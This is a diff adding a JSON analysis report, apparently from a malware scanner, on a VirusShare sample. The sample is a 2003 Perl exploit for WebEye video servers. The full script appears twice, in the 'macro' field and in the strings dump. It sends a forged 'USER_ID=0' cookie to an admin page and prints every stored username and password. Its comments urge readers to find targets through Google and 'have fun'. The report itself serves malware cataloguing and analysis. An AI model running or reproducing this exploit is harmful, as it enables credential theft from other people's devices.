@@ -1,0 +1,79 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "#!/usr/bin/perl\n\n########################################################################\n# Author: datapath\n# E-mail: datapath@softhome.net\n# Date: Dec 2003\n# 44c545672ac14e9e0f968b3affcd0740\n\n# WHAT IS THIS?\n#  This is an exploit to retrieve all username and passwords from a\n#  webeye video server.\n\n# REQUIREMENTS\n#  It requires some perl libraries. If you dont have them already\n#  installed, search cpan.org.\n\n# HOW DOES IT WORKS?\n#  Well, its very simple, because the server provides a mechanism (not \n#  documented) to retrieve all passwords! You can read the code below,\n#  its short and simple.\n\n#  If you think its fun, but dont know any webeye video server, just make a \n#  search in Google. You will find a lot of them! Have fun!\n###########################################################################\n\nuse LWP::UserAgent;\nuse HTTP::Cookies;\n\n$host=shift;\n\nif ($host eq \"\") {\n  print \"Usage: webeye-xp.pl <host name>\\n\";\n  exit;\n}\n\nmy $browser = LWP::UserAgent->new();\n\nmy $resp = $browser->get(\"http://$host/admin/wg_user-info.ml\",\"Cookie\",\"USER_ID=0; path=/;\");\n\n$t = $resp->content;\n\n#print $t;\n\n$i = index($t,\"<tr\");\nsubstr($t,0,$i+1,\"\");\n\nwhile ($i!=-1) {\n  $i = index($t,\"<tr\");\n  substr($t,0,$i+1,\"\");\n  $i = index($t,\"value=\");\n  substr($t,0,$i+7,\"\");\n  $j = index($t,\"\\\"\");\n  $user = substr($t,0,$j);\n  if ($user =~ /Apply/) { print \"\\nHave fun!\\n\"; exit; }\n  print \"user: \".$user;\n  $i = index($t,\"value=\");\n  substr($t,0,$i+7,\"\");\n  $j = index($t,\"\\\"\");\n  print \"\\tpass: \".substr($t,0,$j).\"\\n\";\n}\n"
+    },
+    "filename": "VirusShare_454f7211393a33314f39ecd05bdb8abc",
+    "filesize": 1587,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "454f7211393a33314f39ecd05bdb8abc",
+        "sha1": "5fc2ba9958e09898ae8a8e4f4f8c50702428610c",
+        "sha256": "9b27ff4ac89506b29613abe866158d6cae62acb874fdc9bb3f2a2183f36c0c15"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "########################################################################",
+            "# Author: datapath",
+            "# E-mail: datapath@softhome.net",
+            "# Date: Dec 2003",
+            "# 44c545672ac14e9e0f968b3affcd0740",
+            "# WHAT IS THIS?",
+            "#  This is an exploit to retrieve all username and passwords from a",
+            "#  webeye video server.",
+            "# REQUIREMENTS",
+            "#  It requires some perl libraries. If you dont have them already",
+            "#  installed, search cpan.org.",
+            "# HOW DOES IT WORKS?",
+            "#  Well, its very simple, because the server provides a mechanism (not ",
+            "#  documented) to retrieve all passwords! You can read the code below,",
+            "#  its short and simple.",
+            "#  If you think its fun, but dont know any webeye video server, just make a ",
+            "#  search in Google. You will find a lot of them! Have fun!",
+            "###########################################################################",
+            "use LWP::UserAgent;",
+            "use HTTP::Cookies;",
+            "$host=shift;",
+            "if ($host eq \"\") {",
+            "  print \"Usage: webeye-xp.pl <host name>\\n\";",
+            "  exit;",
+            "my $browser = LWP::UserAgent->new();",
+            "my $resp = $browser->get(\"http://$host/admin/wg_user-info.ml\",\"Cookie\",\"USER_ID=0; path=/;\");",
+            "$t = $resp->content;",
+            "#print $t;",
+            "$i = index($t,\"<tr\");",
+            "substr($t,0,$i+1,\"\");",
+            "while ($i!=-1) {",
+            "  $i = index($t,\"<tr\");",
+            "  substr($t,0,$i+1,\"\");",
+            "  $i = index($t,\"value=\");",
+            "  substr($t,0,$i+7,\"\");",
+            "  $j = index($t,\"\\\"\");",
+            "  $user = substr($t,0,$j);",
+            "  if ($user =~ /Apply/) { print \"\\nHave fun!\\n\"; exit; }",
+            "  print \"user: \".$user;",
+            "  $i = index($t,\"value=\");",
+            "  substr($t,0,$i+7,\"\");",
+            "  $j = index($t,\"\\\"\");",
+            "  print \"\\tpass: \".substr($t,0,$j).\"\\n\";"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://host/admin/wg_user-info.ml"
+        ]
+    },
+    "time": "0:00:00.281063",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
